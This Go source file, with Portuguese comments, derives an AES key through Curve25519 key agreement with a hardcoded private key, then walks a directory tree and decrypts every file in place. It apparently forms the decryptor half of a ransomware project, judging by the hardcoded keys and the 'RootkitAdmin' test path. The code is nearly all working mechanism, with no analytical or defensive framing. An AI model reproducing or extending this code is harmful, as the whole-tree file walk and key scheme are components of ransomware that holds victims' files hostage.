	package main

	import (
	  "fmt"
	  "os"
	  "log"
	  "path/filepath"
	  "golang.org/x/crypto/curve25519"
	  
	  "crypto/sha256"
	  "crypto/aes"
	  "crypto/cipher"
	)
var k [32]byte
var shared [32]byte
var pub= [32]byte{181, 217, 53, 199, 235, 151, 30, 27, 43, 52, 229, 180, 108, 26, 154, 122, 120, 233, 153, 255, 128, 22, 105, 161, 174, 114, 25, 253, 245, 149, 83, 115}
var priv [32]byte
var pub2 =[32]byte{14, 54, 78 ,147, 219, 46, 173, 49, 165, 160, 248, 99, 188, 13, 95, 179, 5, 10, 26, 85, 28, 82, 38, 225, 157, 246, 167, 8 ,85, 204, 233 ,12}
//chave provada
var chave_privada =[32]byte{217, 181 ,170, 182, 154,158, 221, 77, 65, 254, 188, 214, 147, 151, 94, 32, 119, 59, 37, 232, 22, 128, 230, 219, 73, 180, 235, 129, 1, 126, 137, 72}
	func GenerateKeyPair()([]byte){
	
	content, err := os.ReadFile("chave.txt")
    if err != nil {
        log.Fatal(err)
    }
    var pubkey [32]byte
	for i:=range pubkey[:]{
	
	pubkey[i]=content[i]
	}
	fmt.Println("chave publica",pubkey)
	  curve25519.ScalarMult(&shared, &chave_privada, &pubkey)
	   k = sha256.Sum256([]byte(shared[:]))
	   
	  
	  
	  return k[:]




	}
	
func DecryptFile( filename string) {
	// Read the encrypted file into memory.
	ciphertext, err := os.ReadFile(filename)
	if err != nil {
		panic(err)
	}

	// Create a new AES cipher block.
	block, err := aes.NewCipher(k[:])
	if err != nil {
		panic(err)
	}

	// Create a new GCM cipher.
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}

	// Get the nonce size.
	nonceSize := aesgcm.NonceSize()
	if len(ciphertext) < nonceSize {
		panic(err)
	}

	// Decrypt the data.
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err)
	}

	// Write the decrypted data back to the file.
	if err := os.WriteFile(filename, plaintext, 0644); err != nil {
		panic(err)
	}
}
	
	
	
	


	func EnumerateFiles(root string) {
	  err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {

		 if !info.IsDir() {
			DecryptFile(path)
		 }
		 return nil
	  })
	  if err != nil {
		 fmt.Printf("Erro ao percorrer o diretório: %v\n", err)
		 return
	  } // se info.IsDir() nao for pasta e um arquivo
	}

	func EnumerateFolders(root string) {
	  err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		 if err != nil {
			//fmt.Printf("Erro ao acessar o caminho %q: %v\n", path, err")
			return err
		 }
		 if info.IsDir() {
			EnumerateFiles(path)

		 } //se info.IsDir for uma pasta passe para funçao de enumeraçao de arquivos vamos testar
		 return nil
	  })
	  if err != nil {
		 // fmt.Printf("Erro ao percorrer o diretório: %v\n", err")
		 return
	  }
	}

	func main() {
	GenerateKeyPair()
	//fmt.Println("a chave e  ",GenerateKeyPair())
	
	  EnumerateFiles("C:\\Users\\RootkitAdmin\\Desktop\\Projeto Go\\Teste")
	  fmt.Println("sua chave privada",k)
	}